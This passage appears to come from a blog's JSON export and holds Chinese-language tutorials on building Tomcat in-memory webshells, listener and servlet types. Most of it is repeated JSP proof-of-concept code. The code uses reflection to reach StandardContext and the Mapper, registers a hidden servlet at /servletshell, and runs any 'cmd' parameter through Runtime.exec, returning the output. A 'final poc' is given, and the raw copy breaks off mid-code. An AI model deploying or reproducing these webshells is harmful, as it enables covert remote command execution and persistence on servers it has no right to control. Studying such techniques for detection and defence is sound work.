class=\"line\">            RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                Field requestf=test.getClass().getDeclaredField(&quot;request&quot;);</span><br><span class=\"line\">                requestf.setAccessible(true);</span><br><span class=\"line\">                Request request= (Request) requestf.get(test);</span><br><span class=\"line\">                Response response=request.getResponse();</span><br><span class=\"line\"></span><br><span class=\"line\">                String cmd=request.getParameter(&quot;cmd&quot;);</span><br><span class=\"line\">                System.out.println(cmd);</span><br><span class=\"line\">                if(cmd!=null)&#123;</span><br><span class=\"line\">                    InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+cmd).getInputStream();</span><br><span class=\"line\">                    ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                    byte[] b = new byte[1024];</span><br><span class=\"line\">                    int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                    while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                        baos.write(b, 0, a);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                    response.getWriter().write(new String(baos.toByteArray()));</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; catch (NoSuchFieldException | IllegalAccessException | IOException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    //获取StandardContext</span><br><span class=\"line\">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class=\"line\"></span><br><span class=\"line\">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    appctx.setAccessible(true);</span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    stdctx.setAccessible(true);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //注入listener</span><br><span class=\"line\">    standardContext.addApplicationEventListener(new Testlistener());</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n"},{"title":"Tomcat内存马—servlet型","date":"2023-06-09T15:11:27.000Z","excerpt":"Tomcat内存马—servlet型","_content":"\n\n\n## 前言\n\n开学鸽了一段时间，现在重新把内存马拿起来\n\n## 正文\n\nservlet型的原理跟前面两种一样，也是想办法动态注册一个servlet。这里先编写一个servlet\n\n\n\n打好断点，开始调试，看看在哪进行的实例化\n\n\n\n调试发现，实例化是在`DefaultInstanceManager#newInstance` 中进行的，继续向前追踪 `clazz` 的来源\n\n\n\n这里也就知道了上文中的 `clazz` 其实就是 `StandardWrapper.servletClass` ，再继续追踪来源的时候，我看到`StandardWrapperValve` 中的 `context` ，也就是 `StandardContext` 有一个 `children` 属性\n\n\n\n直接眼前一亮，这里面存储了路由与wrapper的对应关系，那如果我们能将恶意的servlet添加进去是不是就可以实现动态注册servlet了，那么怎么才能将其添加进去呢。看到 `StandardContext` 有一个 `addServlet` 方法\n\n\n\n不过并没有具体实现，但是我们在其子类`ApplicationContext` 中找到了实现流程\n\n\n\n先判断状态，然后调用 `createWrapper` 方法去封装 `servlet` ，接着调用 `addChild` 方法将其添加到 `children` 中，那么我们是否能通过调用该方法实现servlet的动态注册呢，先试一下，简单写个demo\n\n```php\n<%@ page import=\"java.io.ByteArrayOutputStream\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.io.Writer\" %>\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.lang.reflect.Method\" %>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n\n<%\n    class Servletshell extends HttpServlet {\n        @Override\n        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            String cmd=req.getParameter(\"cmd\");\n            if(cmd!=null){\n                InputStream in = Runtime.getRuntime().exec(\"cmd /c \"+cmd).getInputStream();\n\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                byte[] b = new byte[1024];\n                int a = -1;\n\n                while ((a = in.read(b)) != -1) {\n                    baos.write(b, 0, a);\n                }\n                Writer writer=resp.getWriter();\n                writer.write(new String(baos.toByteArray()));\n                writer.flush();\n            }\n        }\n\n        @Override\n        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            super.doPost(req, resp);\n        }\n    }\n%>\n\n<%\n    //获取context\n    ServletContext servletContext = request.getSession().getServletContext();\n\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n    //修改状态\n    Field state=Class.forName(\"org.apache.catalina.util.LifecycleBase\").getDeclaredField(\"state\");\n    state.setAccessible(true);\n    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);\n\n    //尝试注入\n    String servletName=\"servletShell\";\n    String servletClass=\"servletShell.class\";\n    Class serletC=Servletshell.class;\n    Method addServlet=Class.forName(\"org.apache.catalina.core.ApplicationContext\").getDeclaredMethod(\"addServlet\", String.class, Class.class);\n    //addServlet.setAccessible(true);\n    addServlet.invoke(applicationContext,servletName,serletC);\n    System.out.println(standardContext.findChildren());\n%>\n```\n\n\n\n可以看到我们自定义的servlet已经插入到 `children` 里了，不过还有一个问题，这没有匹配的路由啊\n\n\n\n所以我们还得想办法将路由对应到 `servlet-name`\n\n\n\n可以看到有 `addServletMapping` 方法，试试看\n\n```auto\n<%@ page import=\"java.io.ByteArrayOutputStream\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.io.Writer\" %>\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.lang.reflect.Method\" %>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n\n<%\n    class Servletshell extends HttpServlet {\n        @Override\n        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            String cmd=req.getParameter(\"cmd\");\n            if(cmd!=null){\n                InputStream in = Runtime.getRuntime().exec(\"cmd /c \"+cmd).getInputStream();\n\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                byte[] b = new byte[1024];\n                int a = -1;\n\n                while ((a = in.read(b)) != -1) {\n                    baos.write(b, 0, a);\n                }\n                Writer writer=resp.getWriter();\n                writer.write(new String(baos.toByteArray()));\n                writer.flush();\n            }\n        }\n\n        @Override\n        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            super.doPost(req, resp);\n        }\n    }\n%>\n\n<%\n    //获取context\n    ServletContext servletContext = request.getSession().getServletContext();\n\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n    //修改状态\n    Field state=Class.forName(\"org.apache.catalina.util.LifecycleBase\").getDeclaredField(\"state\");\n    state.setAccessible(true);\n    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);\n\n    //尝试注入\n    String servletName=\"servletShell\";\n    String urlpattern=\"/servletshell\";\n    Class serletC=Servletshell.class;\n\n    Method addServlet=Class.forName(\"org.apache.catalina.core.ApplicationContext\").getDeclaredMethod(\"addServlet\", String.class, Class.class);\n    addServlet.invoke(applicationContext,servletName,serletC);\n\n    Method addServletMapping=Class.forName(\"org.apache.catalina.core.StandardContext\").getDeclaredMethod(\"addServletMapping\", String.class, String.class);\n    addServletMapping.invoke(standardContext,urlpattern,servletName);\n\n    System.out.println(standardContext.findChildren());\n%>\n```\n\n\n\n可以看到已经添加进去了，但是访问该路由却是503，并且正常页面也变成503了，猜测是破坏了内存中的结构之类的\n\n不好意思，是我sb了，没把状态修改回来。只需要在后面添加如下代码\n\n```auto\nif(state!=null){\n        state.set(standardContext,org.apache.catalina.LifecycleState.STARTED);\n    }\n```\n\n不过，访问变成了404\n\n\n\n现在来分析一下为啥没有正常访问到，在 `ApplicationFilterChain#`\\`internalDoFilter `中调用` servlet `的` service\\` 方法处打个断点\n\n\n\n可以看到这里获取到的是 `DefaultServlet` ，而不是我们注入的 `ServletShell` ，我们现在就来追踪一下这个servlet的来源，该servlet是通过 `setServlet` 方法进行赋值的，在该方法处打个断点\n\n\n\n在`ApplicationFilterFactor#createFilterChain`方法中调用该方法进行赋值\n\n\n\n继续往前追踪，在`StandardWrapperValv#invoke`可以看到\n\n\n\nservlet是 `wrapper.allocate` 的返回值，跟进一下这个方法\n\n\n\n简单看一下可知，这里是返回了 `instance` 属性的值，那么此时我们要继续追寻 `instance` 属性的来源，直接看一下 `wrapper` 是咋来的\n\n\n\n跟进 `getContainer`\n\n\n\n对应的赋值方法为 `setContainer` ，在那打个断点，然后没断下来，说明没有调用到该方法，然后看到上层的`StandardContextValve#invoke`\n\n\n\n可以看到wrapper已经被赋值了，该 `wrapper`是从 `request`中获取的，那么我们又要继续追溯 `request` 对象的来源了，看到`org.apache.catalina.connector.CoyoteAdapter#service`\n\n\n\n这里获取了 `request` 对象，然后在下面调用了`postParseRequest` 处理\n\n\n\n跟进\n\n这里算是一个关键地方，后面就是map方面的操作了\n\n\n\n跟踪到这里，也就是`org.apache.catalina.mappe.Mapper#internalMap`的时候，发现了一个关键的属性 `contextVersion`\n\n\n\n可以看到 `contextVersion`中的 `exactWrappers` 中存储了我们自定义的其他两个servlet的 `wrapper` ，但是我们动态注入进去的servlet却没有，这貌似也就解释了响应码是404的原因。那么如果我们能将需要注入的servlet的wrapper添加到这里面，就可以成功了呢？说干就干，先找一下有没有方法可以将wrapper插入进去，还真有一个 `addWrapper` 方法\n\n\n\n要使用这个方法，我们就需要获取到 `contextVersion` ，还要创建一个自定义的 `wrapper`\n\n先解决第一个问题 — 获取 `contextVersion`\n\n无意之间看到了这么一行代码\n\n\n\n然后去看了看 `contextObjectToContextVersionMap`\n\n\n\n里面果然存储了 `contextVersion` ，那么我们也就可以通过这个属性获取到 `contextVersion`,那么现在的问题就变成了获取`contextObjectToContextVersionMap` ，只要我们获取到这个mapper对象，也就可以顺理成章的获取到这个属性。所以问题又变成了获取mapper对象，这时我们看到之前说的那个关键操作点\n\n\n\n这里先获取到service属性在调用 `getMapper` 获取到 `mapper` 对象，那么我们现在就要想办法去获取到这个 `StandardService` ，后面调试了半天，到处追踪，终于看到了希望\n\n\n\n可以看到在 `ApplicationContext` 中有 `service` 这个属性，而 `ApplicationContext` 我们已经能够获取到了，所以问题圆满解决。\n\n```auto\n//获取service属性\n    Field servicef=applicationContext.getClass().getDeclaredField(\"service\");\n    servicef.setAccessible(true);\n    StandardService service=(StandardService) servicef.get(applicationContext);\n\n    //获取mapper\n    Mapper mapper=service.getMapper();\n\n    //获取contextVersion\n    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(\"contextObjectToContextVersionMap\");\n    contextObjectToContextVersionMapf.setAccessible(true);\n    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);\n    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);\n\n    //调用addWrapper方法\n    Class[] classes=mapper.getClass().getDeclaredClasses();\n    Class classt=classes[1];\n    Method addWrapper=mapper.getClass().getDeclaredMethod(\"addWrapper\", classt, String.class, Wrapper.class, boolean.class, boolean.class);\n    addWrapper.setAccessible(true);\n    addWrapper.invoke(mapper,contextVersion,\"/servletshell\",shellWrapper,false,false);\n    System.out.println(\"ook\");\n```\n\n继续看第二个问题 — 创建自定义 `wrapper`\n\n在 `StandardContext`中，存在 `createWrapper` 方法，我们可以通过该方法来创建自定义的 `wrapper`\n\n\n\n```auto\n//创建自定义wrapper\n    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();\n    shellWrapper.setServlet(shell);\n    shellWrapper.setServletClass(shell.getClass().getName());\n```\n\n然后我们组合一下\n\n```auto\n<%@ page import=\"java.io.ByteArrayOutputStream\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.io.Writer\" %>\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.lang.reflect.Method\" %>\n<%@ page import=\"org.apache.catalina.core.StandardWrapper\" %>\n<%@ page import=\"org.apache.catalina.core.StandardService\" %>\n<%@ page import=\"org.apache.catalina.mapper.Mapper\" %>\n<%@ page import=\"org.apache.catalina.Wrapper\" %>\n<%@ page import=\"java.util.concurrent.ConcurrentHashMap\" %>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n\n<%\n    class Servletshell extends HttpServlet {\n        @Override\n        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            String cmd=req.getParameter(\"cmd\");\n            if(cmd!=null){\n                InputStream in = Runtime.getRuntime().exec(\"cmd /c \"+cmd).getInputStream();\n\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                byte[] b = new byte[1024];\n                int a = -1;\n\n                while ((a = in.read(b)) != -1) {\n                    baos.write(b, 0, a);\n                }\n                Writer writer=resp.getWriter();\n                writer.write(new String(baos.toByteArray()));\n                writer.flush();\n            }\n        }\n\n        @Override\n        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            super.doPost(req, resp);\n        }\n    }\n%>\n\n<%\n    //获取context\n    ServletContext servletContext = request.getSession().getServletContext();\n\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n    //修改状态\n    Field state=Class.forName(\"org.apache.catalina.util.LifecycleBase\").getDeclaredField(\"state\");\n    state.setAccessible(true);\n    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);\n\n    //尝试注入\n    String servletName=\"ServletShell\";\n    String urlpattern=\"/servletshell\";\n    Class serletC=Servletshell.class;\n\n    Method addServlet=Class.forName(\"org.apache.catalina.core.ApplicationContext\").getDeclaredMethod(\"addServlet\", String.class, Class.class);\n    addServlet.invoke(applicationContext,servletName,serletC);\n\n    Method addServletMapping=Class.forName(\"org.apache.catalina.core.StandardContext\").getDeclaredMethod(\"addServletMapping\", String.class, String.class);\n    addServletMapping.invoke(standardContext,urlpattern,servletName);\n\n    Servletshell shell=new Servletshell();\n    //创建自定义wrapper\n    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();\n    shellWrapper.setServlet(shell);\n    shellWrapper.setServletClass(shell.getClass().getName());\n    //shellWrapper.addMapping(\"/servletshell\");\n\n    //获取service属性\n    Field servicef=applicationContext.getClass().getDeclaredField(\"service\");\n    servicef.setAccessible(true);\n    StandardService service=(StandardService) servicef.get(applicationContext);\n\n    //获取mapper\n    Mapper mapper=service.getMapper();\n\n    //获取contextVersion\n    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(\"contextObjectToContextVersionMap\");\n    contextObjectToContextVersionMapf.setAccessible(true);\n    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);\n    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);\n\n    //调用addWrapper方法\n    Class[] classes=mapper.getClass().getDeclaredClasses();\n    Class classt=classes[1];\n    Method addWrapper=mapper.getClass().getDeclaredMethod(\"addWrapper\", classt, String.class, Wrapper.class, boolean.class, boolean.class);\n    addWrapper.setAccessible(true);\n    addWrapper.invoke(mapper,contextVersion,\"/servletshell\",shellWrapper,false,false);\n    System.out.println(\"ook\");\n\n    if(state!=null){\n        state.set(standardContext,org.apache.catalina.LifecycleState.STARTED);\n    }\n%>\n```\n\n\n\n但是访问还是报500，看一下是否将wrapper正确添加了\n\n可以看到确实将wrapper添加了进去，但是格式不太对，回去看了一下wrapper的属性，原来是没有设置 `parent` 属性\n\n```auto\nshellWrapper.setParent(standardContext);\n```\n\n添加这一行即可，修改后的poc\n\n```auto\n<%@ page import=\"java.io.ByteArrayOutputStream\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.io.Writer\" %>\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.lang.reflect.Method\" %>\n<%@ page import=\"org.apache.catalina.core.StandardWrapper\" %>\n<%@ page import=\"org.apache.catalina.core.StandardService\" %>\n<%@ page import=\"org.apache.catalina.mapper.Mapper\" %>\n<%@ page import=\"org.apache.catalina.Wrapper\" %>\n<%@ page import=\"java.util.concurrent.ConcurrentHashMap\" %>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n\n<%\n    class Servletshell extends HttpServlet {\n        @Override\n        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            String cmd=req.getParameter(\"cmd\");\n            if(cmd!=null){\n                InputStream in = Runtime.getRuntime().exec(\"cmd /c \"+cmd).getInputStream();\n\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                byte[] b = new byte[1024];\n                int a = -1;\n\n                while ((a = in.read(b)) != -1) {\n                    baos.write(b, 0, a);\n                }\n                Writer writer=resp.getWriter();\n                writer.write(new String(baos.toByteArray()));\n                writer.flush();\n            }\n        }\n\n        @Override\n        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            super.doPost(req, resp);\n        }\n    }\n%>\n\n<%\n    //获取context\n    ServletContext servletContext = request.getSession().getServletContext();\n\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n    //修改状态\n    Field state=Class.forName(\"org.apache.catalina.util.LifecycleBase\").getDeclaredField(\"state\");\n    state.setAccessible(true);\n    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);\n\n    //尝试注入\n    String servletName=\"ServletShell\";\n    String urlpattern=\"/servletshell\";\n    Class serletC=Servletshell.class;\n\n    Method addServlet=Class.forName(\"org.apache.catalina.core.ApplicationContext\").getDeclaredMethod(\"addServlet\", String.class, Class.class);\n    addServlet.invoke(applicationContext,servletName,serletC);\n\n    Method addServletMapping=Class.forName(\"org.apache.catalina.core.StandardContext\").getDeclaredMethod(\"addServletMapping\", String.class, String.class);\n    addServletMapping.invoke(standardContext,urlpattern,servletName);\n\n    Servletshell shell=new Servletshell();\n    //创建自定义wrapper\n    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();\n    shellWrapper.setServlet(shell);\n    shellWrapper.setServletClass(shell.getClass().getName());\n    shellWrapper.setParent(standardContext);\n    //shellWrapper.addMapping(\"/servletshell\");\n\n    //获取service属性\n    Field servicef=applicationContext.getClass().getDeclaredField(\"service\");\n    servicef.setAccessible(true);\n    StandardService service=(StandardService) servicef.get(applicationContext);\n\n    //获取mapper\n    Mapper mapper=service.getMapper();\n\n    //获取contextVersion\n    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(\"contextObjectToContextVersionMap\");\n    contextObjectToContextVersionMapf.setAccessible(true);\n    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);\n    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);\n\n    //调用addWrapper方法\n    Class[] classes=mapper.getClass().getDeclaredClasses();\n    Class classt=classes[1];\n    Method addWrapper=mapper.getClass().getDeclaredMethod(\"addWrapper\", classt, String.class, Wrapper.class, boolean.class, boolean.class);\n    addWrapper.setAccessible(true);\n    addWrapper.invoke(mapper,contextVersion,\"/servletshell\",shellWrapper,false,false);\n    System.out.println(\"ook\");\n\n    if(state!=null){\n        state.set(standardContext,org.apache.catalina.LifecycleState.STARTED);\n    }\n%>\n```\n\n\n\n成功注入\n\n后面测试了一下，前面的 addservlet方法这些不需要执行就能成功，所以最终poc\n\n```auto\n<%@ page import=\"java.io.ByteArrayOutputStream\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.io.Writer\" %>\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.lang.reflect.Method\" %>\n<%@ page import=\"org.apache.catalina.core.StandardWrapper\" %>\n<%@ page import=\"org.apache.catalina.core.StandardService\" %>\n<%@ page import=\"org.apache.catalina.mapper.Mapper\" %>\n<%@ page import=\"org.apache.catalina.Wrapper\" %>\n<%@ page import=\"java.util.concurrent.ConcurrentHashMap\" %>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n\n<%\n    class Servletshell extends HttpServlet {\n        @Override\n        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            String cmd=req.getParameter(\"cmd\");\n            if(cmd!=null){\n                InputStream in = Runtime.getRuntime().exec(\"cmd /c \"+cmd).getInputStream();\n\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                byte[] b = new byte[1024];\n                int a = -1;\n\n                while ((a = in.read(b)) != -1) {\n                    baos.write(b, 0, a);\n                }\n                Writer writer=resp.getWriter();\n                writer.write(new String(baos.toByteArray()));\n                writer.flush();\n            }\n        }\n\n        @Override\n        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            super.doPost(req, resp);\n        }\n    }\n%>\n\n<%\n    //获取context\n    ServletContext servletContext = request.getSession().getServletContext();\n\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n      //创建自定义wrapper\n    Servletshell shell=new Servletshell()\n    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();\n    shellWrapper.setServlet(shell);\n    shellWrapper.setServletClass(shell.getClass().getName());\n    shellWrapper.setParent(standardContext);\n\n    //获取service属性\n    Field servicef=applicationContext.getClass().getDeclaredField(\"service\");\n    servicef.setAccessible(true);\n    StandardService service=(StandardService) servicef.get(applicationContext);\n\n    //获取mapper\n    Mapper mapper=service.getMapper();\n\n    //获取contextVersion\n    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(\"contextObjectToContextVersionMap\");\n    contextObjectToContextVersionMapf.setAccessible(true);\n    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);\n    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);\n\n    //调用addWrapper方法\n    Class[] classes=mapper.getClass().getDeclaredClasses();\n    Class classt=classes[1];\n    Method addWrapper=mapper.getClass().getDeclaredMethod(\"addWrapper\", classt, String.class, Wrapper.class, boolean.class, boolean.class);\n    addWrapper.setAccessible(true);\n    addWrapper.invoke(mapper,contextVersion,\"/servletshell\",shellWrapper,false,false);\n%>\n```\n\n简短了很多\n\n## 总结\n\n在实现servlet内存马的过程中，没有像以前一样，完全照着资料做，大部分都是自己来调试，花的时间确实要多了一些，不过感觉这样的影响更深刻，还可以有一些自己的理解，感觉很好。不过因为许多是自己的理解，所以肯定会有错误的地方，希望各位师傅不吝赐教。\n\n","source":"_posts/Tomcat内存马—servlet型.md","raw":"---\ntitle: Tomcat内存马—servlet型\ndate: 2023-06-09 23:11:27\nexcerpt: Tomcat内存马—servlet型\ncategories: 学习\n---\n\n\n\n## 前言\n\n开学鸽了一段时间，现在重新把内存马拿起来\n\n## 正文\n\nservlet型的原理跟前面两种一样，也是想办法动态注册一个servlet。这里先编写一个servlet\n\n\n\n打好断点，开始调试，看看在哪进行的实例化\n\n\n\n调试发现，实例化是在`DefaultInstanceManager#newInstance` 中进行的，继续向前追踪 `clazz` 的来源\n\n\n\n这里也就知道了上文中的 `clazz` 其实就是 `StandardWrapper.servletClass` ，再继续追踪来源的时候，我看到`StandardWrapperValve` 中的 `context` ，也就是 `StandardContext` 有一个 `children` 属性\n\n\n\n直接眼前一亮，这里面存储了路由与wrapper的对应关系，那如果我们能将恶意的servlet添加进去是不是就可以实现动态注册servlet了，那么怎么才能将其添加进去呢。看到 `StandardContext` 有一个 `addServlet` 方法\n\n\n\n不过并没有具体实现，但是我们在其子类`ApplicationContext` 中找到了实现流程\n\n\n\n先判断状态，然后调用 `createWrapper` 方法去封装 `servlet` ，接着调用 `addChild` 方法将其添加到 `children` 中，那么我们是否能通过调用该方法实现servlet的动态注册呢，先试一下，简单写个demo\n\n```php\n<%@ page import=\"java.io.ByteArrayOutputStream\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.io.Writer\" %>\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.lang.reflect.Method\" %>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n\n<%\n    class Servletshell extends HttpServlet {\n        @Override\n        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            String cmd=req.getParameter(\"cmd\");\n            if(cmd!=null){\n                InputStream in = Runtime.getRuntime().exec(\"cmd /c \"+cmd).getInputStream();\n\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                byte[] b = new byte[1024];\n                int a = -1;\n\n                while ((a = in.read(b)) != -1) {\n                    baos.write(b, 0, a);\n                }\n                Writer writer=resp.getWriter();\n                writer.write(new String(baos.toByteArray()));\n                writer.flush();\n            }\n        }\n\n        @Override\n        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            super.doPost(req, resp);\n        }\n    }\n%>\n\n<%\n    //获取context\n    ServletContext servletContext = request.getSession().getServletContext();\n\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n    //修改状态\n    Field state=Class.forName(\"org.apache.catalina.util.LifecycleBase\").getDeclaredField(\"state\");\n    state.setAccessible(true);\n    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);\n\n    //尝试注入\n    String servletName=\"servletShell\";\n    String servletClass=\"servletShell.class\";\n    Class serletC=Servletshell.class;\n    Method addServlet=Class.forName(\"org.apache.catalina.core.ApplicationContext\").getDeclaredMethod(\"addServlet\", String.class, Class.class);\n    //addServlet.setAccessible(true);\n    addServlet.invoke(applicationContext,servletName,serletC);\n    System.out.println(standardContext.findChildren());\n%>\n```\n\n\n\n可以看到我们自定义的servlet已经插入到 `children` 里了，不过还有一个问题，这没有匹配的路由啊\n\n\n\n所以我们还得想办法将路由对应到 `servlet-name`\n\n\n\n可以看到有 `addServletMapping` 方法，试试看\n\n```auto\n<%@ page import=\"java.io.ByteArrayOutputStream\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.io.Writer\" %>\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.lang.reflect.Method\" %>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n\n<%\n    class Servletshell extends HttpServlet {\n        @Override\n        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            String cmd=req.getParameter(\"cmd\");\n            if(cmd!=null){\n                InputStream in = Runtime.getRuntime().exec(\"cmd /c \"+cmd).getInputStream();\n\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                byte[] b = new byte[1024];\n                int a = -1;\n\n                while ((a = in.read(b)) != -1) {\n                    baos.write(b, 0, a);\n                }\n                Writer writer=resp.getWriter();\n                writer.write(new String(baos.toByteArray()));\n                writer.flush();\n            }\n     